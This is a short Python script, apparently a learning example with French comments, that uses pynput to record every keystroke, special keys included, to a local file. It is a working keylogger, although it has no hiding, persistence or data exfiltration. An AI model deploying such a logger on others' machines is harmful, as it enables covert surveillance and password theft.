#pynput
from pynput import keyboard

log_file = "keys.txt"

def on_press(key):
    # hasattr() permet de vérifier si un objet a un attribut donné
    with open(log_file, "a") as f:
        if hasattr(key, 'char') and key.char is not None:
            f.write(key.char)  # Enregistre la touche normale
        else:
            f.write(f" [{key}] ")  # Enregistre les touches spéciales (Ctrl, Shift...)

# Détecteur de clavier
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()